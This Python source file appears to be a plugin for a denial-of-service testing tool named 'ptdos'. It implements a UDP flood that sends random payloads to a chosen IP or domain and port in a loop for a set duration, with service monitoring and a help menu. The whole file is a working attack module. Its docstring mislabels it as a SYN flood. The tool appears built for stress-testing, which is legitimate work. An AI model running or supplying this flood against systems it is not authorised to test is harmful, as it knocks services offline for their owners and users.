"""ptdos extension that adds a SYN Flood attack."""
# python3 ptdos.py -a udpflood -dst 192.168.0.80 -dp 80 -dl 128 -d 4 -st 0.001 --json

# own libs
from infrastructure import factory
from misc.pt_socket import create_socket
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error, validate_domain
from misc.globalfuncs import get_ip_from_dst, generate_payload
# external libs
from ptlibs.ptmisclib import out_if, ptprint, out_ifnot
from time import time, asctime, sleep
from dataclasses import dataclass
from socket import error


@dataclass
class UdpFlood:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        dstport = args['dstport']
        payload_len = args['datalength']
        sleeptime = args['sleeptime']
        packets = 0

        # initialize udp socket
        sock = create_socket(self.name)

        # generate random payload
        payload = generate_payload(self.name, payload_len)

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        # If domain is present convert it to IP, udp attack is slowed because of domain conversion on the go
        if validate_domain(dst):
            udp_att_dest = get_ip_from_dst(dst)
        else:
            udp_att_dest = dst

        try:
            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    sock.close()  # stop attack
                    monitoringprocess()  # stop checkservice end monitoring
                    sleep(1)  # wait for 1 second to stop the monitoring process
                    att_end_t_asc = asctime()  # save attack's ending time
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break

                # do the UDP flood attack
                try:
                    sock.sendto(payload, (udp_att_dest, dstport))
                    packets += 1
                    sleep(sleeptime)

                except error as serr:
                    ptprint(out_ifnot(f"Close socket due to {serr}.", "ERROR", use_json))
                    sock.close()  # close socket
                    sleep(0.25)  # wait for closing socket
                    ptprint(out_ifnot("Create new socket.", "INFO", use_json))
                    sock = create_socket(self.name)
                    ptprint(out_ifnot(f"Continue {self.name} attack with new socket.", "INFO", use_json))

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, packets, dstport)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print json to console if JSON == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            sock.close()  # stop attack
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"UDP Flood attack options": [
                ["-a", "--attack", "udpflood", "Attack name - udpflood"],
                ["-d", "--duration", "<duration>", "Specify attack's duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "Specify destination IP or domain."],
                ["-dp", "--dstport", "<dstport>", "Specify destination port. Default 80."],
                ["-dl", "--data-length", "<datalength>", "Include len random bytes as payload. Default 1024 bytes."],
                ["-st", "--sleep-time", "<sleeptime>", "Time in seconds between UDP segments. Default 0 seconds."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("udpflood", UdpFlood)
